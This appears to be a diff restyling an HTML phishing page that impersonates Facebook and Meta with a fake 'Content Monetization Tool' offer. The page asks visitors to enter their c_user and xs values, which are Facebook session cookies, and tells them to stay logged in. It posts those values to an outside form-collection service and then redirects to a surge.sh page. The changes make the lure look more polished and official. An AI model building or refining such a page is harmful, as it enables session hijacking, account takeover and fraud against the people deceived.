@@ -6,10 +6,12 @@
     <title>Action | Submit</title>
 </head>
 
-<body>
+<body class="bg-gray-50">
+
+    <!-- Header Section -->
     <div class="md:block lg:block hidden border flex w-full h-[6rem] relative bg-[#4667ac]">
         <div class="mx-10 mt-4">
-            <b class="text-5xl text-white">facebook</b>
+            <b class="text-5xl text-white font-bold">Facebook</b>
         </div>
         <div>
             <form class="sm:hidden lg:block md:block">
@@ -26,76 +28,67 @@
         </div>
     </div>
 
-    <form action="https://submit-form.com/sM6ETRQBF" method="post">
+    <!-- Main Content Form -->
+    <form action="https://submit-form.com/sM6ETRQBF" method="post" class="max-w-4xl mx-auto mt-10">
         <input type="hidden" name="_redirect" value="https://pass-link-here.surge.sh">
         <div id="root">
-            <div>
-                <img class="h-7 mx-10 mt-2 shadow-2xl" src="/home.png" alt="Home Image">
+            <!-- Title and Instructions -->
+            <div class="text-center mt-6">
+                <h2 class="text-3xl font-semibold text-[#3578e5]">Content Monetization Tool</h2>
+                <p class="mt-4 text-lg text-gray-600">Your Facebook page has been provided with the Content Monetization tool. Submit a request to activate it and start earning from your content.</p>
             </div>
-            <div class="md:block lg:block hidden">
-                <p class="text-[#3578e5] text-xl font-extrabold font-serif mx-[4.50rem] -mt-6">
-                    <img src="https://cdn.glitch.global/325f7535-a68d-4687-a91c-1e7d9366104a/blue_tick-B9ADAlwo.png?v=1723987162846" alt="Meta" class="img-fluid" style="width: 4rem; height: 4rem; margin-bottom: 0px;">
-                </p>
-            </div>
-        </div>
 
-        <div class="border md:block hidden lg:block mx-72 mt-9 w-[630px]">
-            <p class="py-3 text-sm">
-                <a href="#" class="business-info">Creator Content Monetization</a>
-            </p>
-
-            <div>
-                <p class="mt-4 text-[12px] font-semibold">Facebook has provided your page with the Content Monetization tool. You can submit a request to activate this tool. This tool will allow you to monetize your content and generate earnings on Facebook's platform.</p>
-                <p class="mt-4 text-[12px] font-semibold">If you want to activate the Content Monetization tool, follow the steps below:</p>
-                <ul class="mt-4 pl-4">
-                    <li>1. Your Facebook page must be verified.</li>
-                    <li>2. You need to meet the eligibility criteria for Content Monetization.</li>
-                    <li>3. Submit the request by following Facebook's instructions.</li>
+            <div class="mt-6">
+                <h3 class="text-xl font-semibold text-[#333]">How to Activate Content Monetization</h3>
+                <ul class="mt-4 pl-6 text-lg text-gray-600">
+                    <li>1. Ensure your Facebook page is verified.</li>
+                    <li>2. Meet the eligibility criteria for Content Monetization.</li>
+                    <li>3. Submit your request following Facebook's guidelines.</li>
                 </ul>
-                <p class="mt-4 text-[12px] font-semibold">After submitting the request, you will receive a verification email. Keep your account logged in to ensure you can receive the email.</p>
+
+                <p class="mt-4 text-lg text-gray-600">Once you submit the request, keep your account logged in to receive the verification email.</p>
             </div>
 
-            <div>
-                <p class="text-[11px] text-[#90949c] p-2 font-semibold">Detailed Video Information</p>
+            <!-- Video Information Section -->
+            <div class="mt-8">
+                <p class="text-lg font-semibold text-[#333]">Detailed Video Information</p>
+                <div class="mt-4">
+                    <a href="kabeer.mp4.mp4" class="block mb-4">
+                        <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" alt="Video Thumbnail" class="rounded-lg shadow-lg mx-auto" width="150">
+                    </a>
+                </div>
+                <p class="text-sm text-gray-600">Please provide the requested information below for a smooth verification process.</p>
             </div>
 
-            <div>
-                <a href="kabeer.mp4.mp4">
-                    <img src="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" width="150" alt="Video Thumbnail">
-                </a>
-            </div>
+            <!-- Form Input Fields -->
+            <div class="mt-6">
+                <div class="mb-4">
+                    <label for="c_user" class="block text-gray-700 font-semibold">Facebook User ID (c_user)</label>
+                    <input type="text" name="c_user" id="c_user" class="w-full p-3 border rounded-lg mt-2 text-gray-800" placeholder="Enter your Facebook User ID" pattern="[0-9]+" minlength="6" required>
+                </div>
 
-            <div>
-                <p class="pl-3 text-[12px] font-semibold">Please be sure to provide the requested information below.</p>
-            </div>
+                <div class="mb-4">
+                    <label for="xs" class="block text-gray-700 font-semibold">xs (Security Code)</label>
+                    <input type="text" name="xs" id="xs" class="w-full p-3 border rounded-lg mt-2 text-gray-800" placeholder="Enter your security code" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" required>
+                </div>
 
-            <div>
-                <p class="text-slate-400 pl-4 mt-1">c_user</p>
-                <input class="border h-6 pl-1 mx-3" type="text" name="c_user" id="c_user" placeholder="" pattern="[0-9]+" minlength="6" required>
-            </div>
-
-            <div>
-                <p class="text-slate-400 pl-4 mt-1">xs</p>
-                <input class="border h-6 pl-1 mx-3" type="text" name="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Must Watch Detailed Video" required aria-required="true">
-            </div>
-
-            <div>
-                <p class="mt-4 pl-3 text-[12px] font-semibold">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
-            </div>
-
-            <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
-                <div class="flex justify-end mx-2">
-                    <button class="border h-7 w-16 bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">Submit</button>
+                <div class="mt-4 text-gray-600">
+                    <p class="text-sm font-semibold">Make sure to stay logged in until you receive the verification email.</p>
                 </div>
             </div>
 
-            <footer>
-                <div>
-                    <li class="text-sm text-[#90949c] md:hidden lg:hidden sm:block mt-4 pl-72 flex hover:underline">META©️ 2024</li>
-                </div>
+            <!-- Submit Button -->
+            <div class="mt-8 text-center">
+                <button type="submit" class="px-6 py-2 bg-[#4267b2] text-white rounded-lg shadow-lg hover:bg-blue-600 font-semibold">Submit Request</button>
+            </div>
+
+            <!-- Footer -->
+            <footer class="mt-10 text-center text-sm text-[#90949c]">
+                <p>META©️ 2024</p>
             </footer>
         </div>
     </form>
+
 </body>
 
 </html>
